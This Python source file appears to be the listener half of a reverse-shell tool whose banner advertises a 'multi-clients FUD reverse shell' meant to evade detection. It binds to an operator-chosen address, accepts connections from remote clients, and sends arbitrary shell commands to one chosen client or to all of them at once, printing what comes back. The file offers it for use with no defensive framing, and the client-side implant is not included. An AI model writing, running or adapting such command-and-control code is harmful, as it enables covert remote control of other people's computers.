import os
import platform
import socket
import json
print("[*] Checking Requirements Module.....")
if platform.system().startswith("Linux"):
    try:
        import termcolor
    except ImportError:
        os.system("python3 -m pip install termcolor -q -q -q")
        import termcolor
    try:
        from strcolored import *
    except:
        os.system("python3 -m pip install strcolored -q -q -q")
        from strcolored import *
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python3 -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style

elif platform.system().startswith("Windows"):
    try:
        import termcolor
    except ImportError:
        os.system("python -m pip install termcolor -q -q -q")
        import termcolor
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
    try:
        from strcolored import *
    except:
        os.system("python -m pip install strcolored -q -q -q")
        from strcolored import *

colorama.deinit()
banner = Center.XCenter("""
********************************************************************************
*    ________   _______ _   _ ____       ____  _   _ _____ _     _   __        *
*   / /  _ \ \ / /  ___| | | |  _ \     / ___|| | | | ____| |   | |  \ \       *
*  | || |_) \ V /| |_  | | | | | | |____\___ \| |_| |  _| | |   | |   | |      *
* < < |  __/ | | |  _| | |_| | |_| |_____|__) |  _  | |___| |___| |___ > >     *
*  | ||_|    |_| |_|    \___/|____/     |____/|_| |_|_____|_____|_____| |      *
*   \_\                                                              /_/       *
*                       GENERATE MULTI-CLIENTS FUD REVERSE SHELL               *
*                              Coded By: Machine1337                           *
********************************************************************************                            
                            \n\n
""")
os.system("cls||clear")
print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
try:
    sip = input(termcolor.colored('\n[*] Enter Your IP (for Listening):- ', 'green'))
    sp = input(termcolor.colored('\n[*] Enter Your Port:- ', 'cyan'))
    HOST = f'{sip}'
    PORT = int(sp)
    BUFFER_SIZE = 4096
    clients = {}
    client_id = 1
    def send_data(client_conn, data):
        json_data = json.dumps(data)
        json_data_bytes = json_data.encode()
        data_length = len(json_data_bytes).to_bytes(4, byteorder='big')
        client_conn.sendall(data_length)
        for i in range(0, len(json_data_bytes), BUFFER_SIZE):
            chunk = json_data_bytes[i:i + BUFFER_SIZE]
            client_conn.sendall(chunk)
    def recv_data(client_conn):
        data_length_bytes = client_conn.recv(4)
        data_length = int.from_bytes(data_length_bytes, byteorder='big')
        json_data_bytes = b""
        bytes_received = 0
        while bytes_received < data_length:
            chunk = client_conn.recv(min(BUFFER_SIZE, data_length - bytes_received))
            json_data_bytes += chunk
            bytes_received += len(chunk)
        json_data = json_data_bytes.decode()
        data = json.loads(json_data)
        return data
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((HOST, PORT))
                s.listen()
                print(termcolor.colored(termcolor.colored('\n[*] Waiting for clients to connect...','yellow')))
                conn, addr = s.accept()
                clients[conn] = f'Client {client_id}'
                print(termcolor.colored(f'\nConnected to {clients[conn]} - {addr}','cyan'))
                client_id += 1
                while True:
                    command = input(Colorate.Vertical(Colors.green_to_yellow, "\n[*]Server Command (Type help):- ", 2))
                    if command.lower() == 'help':
                        print('''
                        list  :   Show Connected Clients
                        id    :   Enter Client ID To Connect
                        back  :   Back From Client To Server
                        ''')
                    elif command.lower() == 'id':
                        client_id_input = input(termcolor.colored("\n[*] Enter client ID: ",'cyan'))
                        selected_client = None
                        for client_conn, client_name in clients.items():
                            if client_name == f'Client {client_id_input}':
                                selected_client = client_conn
                                break
                        if selected_client is not None:
                            while True:
                                command = input(Colorate.Vertical(Colors.green_to_yellow, f"\nSHELL@{clients[selected_client]} (Type help): ", 2))
                                if command.lower() == 'back':
                                    break
                                elif command.lower() == 'help':
                                    print('''
                                    cd ..    :   Back From Current Directory
                                    cd {foldername}    :  Change To Given Folder
                                    back  :   Back From Client To Server
                                                            ''')
                                else:
                                    send_data(selected_client, command)
                                    data = recv_data(selected_client)
                                    print(f'{clients[selected_client]}: {data}')
                        else:
                            print(termcolor.colored(f"\n[*] Client ID {client_id_input} not found.",'red'))
                    elif command.lower() == 'list':
                        print(termcolor.colored('\n[+] Connected Clients:- \n','cyan'))
                        for client_conn, client_name in clients.items():
                            print(f"{client_name}: {client_conn.getpeername()[0]}:{client_conn.getpeername()[1]}")
                    else:
                        for client_conn in clients.keys():
                            send_data(client_conn, command)
                            data = recv_data(client_conn)
                            print(f'{clients[client_conn]}: {data}')

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(termcolor.colored('\n[*] An error occurred:', str(e),'red'))
    for client_conn in clients.keys():
        client_conn.close()
except KeyboardInterrupt:
    print(termcolor.colored('\n[*] Keyboard Interuption Occured!!!','red'))

#coded by machine1337...Don't copy this code without giving me a star
